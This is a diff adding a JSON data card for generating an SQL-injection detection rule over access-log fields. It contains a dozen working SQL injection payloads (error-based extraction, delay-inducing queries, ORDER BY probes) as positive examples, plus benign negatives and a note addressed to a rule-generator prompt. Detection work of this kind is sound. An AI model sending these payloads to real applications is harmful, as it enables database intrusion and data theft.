@@ -1,0 +1,38 @@
+{
+  "cluster_id": "SQLI-COMMENT_EVASION",
+  "category": "SQLI",
+  "subcategory": "COMMENT_EVASION",
+  "suggested_rule_id": "SQLI-COMMENT-001",
+  "suggested_target_field": "query",
+  "count": 1349,
+  "positive_examples": [
+    "select   (  case when   (  2350  =  8682  )   then 2350 else 1/  (  select 0  )   end  )  --",
+    "1%' and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",
+    "1'  )   as bvvl where 9818  =  9818 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",
+    "1'  )   where 7887  =  7887 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",
+    "1%'));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",
+    "1' where 3612=3612 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",
+    "1'   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",
+    "1'  )   as ljpy where 8270  =  8270 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",
+    "-3750'+  (  select alpu where 3911  =  3911 order by 1--",
+    "1%\"   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",
+    "1' in boolean mode  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",
+    "-6357\") order by 1--"
+  ],
+  "negative_examples": [
+    "monino",
+    "6657407608418544",
+    "ademaro",
+    "ba46ea5",
+    "1erso",
+    "calle madagascar 130",
+    "0769789407660165",
+    "51egible"
+  ],
+  "source_datasets": [
+    "FuzzDB",
+    "HttpParamsDataset",
+    "modified-sql-dataset"
+  ],
+  "notes": "Use this card with ai/prompts/rule-generator.md. Emit one abstract rule JSON only. Do not paste the full corpus. Do not overfit a single payload. Rules must apply to access-log fields path/query/ua/raw — not POST body."
+}
